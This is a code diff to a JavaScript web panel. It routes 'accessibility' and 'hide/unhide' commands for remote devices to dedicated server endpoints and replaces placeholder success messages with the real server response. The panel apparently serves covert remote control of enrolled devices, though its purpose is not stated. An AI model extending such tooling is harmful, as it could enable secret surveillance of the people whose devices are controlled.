@@ -346,7 +346,7 @@ const app = {
         }
     },
 
-    // ✅ UPDATED: ACCESSIBILITY COMMAND SEND KARO
+    // ✅ FIXED: ACCESSIBILITY COMMAND SEND KARO - CORRECT ENDPOINT
     sendAccessibilityCommand: async function(deviceId, action, event) {
         event.stopPropagation();
         
@@ -357,7 +357,7 @@ const app = {
             
             if (!confirm(confirmMessage)) return;
             
-            // ✅ SERVER KO ACCESSIBILITY COMMAND SEND KARO
+            // ✅ CORRECT ENDPOINT USE KARO
             const response = await this.sendAccessibilityRequest(deviceId, action);
             
             if (response.success) {
@@ -373,13 +373,13 @@ const app = {
         }
     },
 
-    // ✅ UPDATED: ACCESSIBILITY REQUEST TO SERVER - TEMPORARY FIX
+    // ✅ FIXED: ACCESSIBILITY REQUEST TO SERVER - CORRECT ENDPOINT
     sendAccessibilityRequest: async function(deviceId, action) {
         try {
             console.log(`🎯 Sending accessibility ${action} for: ${deviceId}`);
             
-            // ✅ TEMPORARY FIX - Same endpoint use karo with different parameter
-            const response = await fetch('https://sukh-3qtl.onrender.com/api/website/app-data', {
+            // ✅ CORRECT ENDPOINT USE KARO
+            const response = await fetch('https://sukh-3qtl.onrender.com/api/accessibility-command', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -387,8 +387,6 @@ const app = {
                 body: JSON.stringify({
                     device_id: deviceId,
                     action: action,
-                    type: 'accessibility_command',
-                    timestamp: new Date().toISOString(),
                     source: 'web_panel'
                 })
             });
@@ -400,22 +398,18 @@ const app = {
             const result = await response.json();
             console.log('📡 Accessibility response:', result);
             
-            // ✅ Temporary success response - Server pe route banane tak
-            return {
-                success: true,
-                message: 'Command sent successfully'
-            };
+            return result; // ✅ Server ka response directly return karo
             
         } catch (error) {
             console.error('❌ Accessibility request error:', error);
             return { 
                 success: false, 
-                message: 'Server not configured for accessibility commands. Please check backend routes.' 
+                message: error.message 
             };
         }
     },
 
-    // ✅ UPDATED: TOGGLE HIDE/UNHIDE FUNCTION
+    // ✅ FIXED: TOGGLE HIDE/UNHIDE FUNCTION
     toggleDeviceHide: async function(deviceId, currentlyHidden, event) {
         event.stopPropagation();
         
@@ -429,7 +423,7 @@ const app = {
                 return;
             }
             
-            // ✅ SERVER KO HIDE/UNHIDE REQUEST SEND KARO
+            // ✅ CORRECT ENDPOINT USE KARO
             const response = await this.sendHideRequest(deviceId, action);
             
             if (response.success) {
@@ -445,22 +439,20 @@ const app = {
         }
     },
 
-    // ✅ UPDATED: SEND HIDE/UNHIDE REQUEST TO SERVER - TEMPORARY FIX
+    // ✅ FIXED: SEND HIDE/UNHIDE REQUEST TO SERVER - CORRECT ENDPOINT
     sendHideRequest: async function(deviceId, action) {
         try {
             console.log(`🎯 Sending ${action} request for device: ${deviceId}`);
             
-            // ✅ TEMPORARY FIX - Same endpoint use karo
-            const response = await fetch('https://sukh-3qtl.onrender.com/api/website/app-data', {
+            // ✅ CORRECT ENDPOINT USE KARO
+            const response = await fetch('https://sukh-3qtl.onrender.com/api/hide-device', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
                     device_id: deviceId,
-                    action: action,
-                    type: 'hide_command',
-                    timestamp: new Date().toISOString()
+                    action: action
                 })
             });
             
@@ -471,17 +463,13 @@ const app = {
             const result = await response.json();
             console.log('📡 Hide response:', result);
             
-            // ✅ Temporary success response - Server pe route banane tak
-            return {
-                success: true,
-                message: 'Hide command sent successfully'
-            };
+            return result; // ✅ Server ka response directly return karo
             
         } catch (error) {
             console.error('❌ Hide request error:', error);
             return {
                 success: false,
-                message: 'Server not configured for hide commands. Please check backend routes.'
+                message: error.message
             };
         }
     },
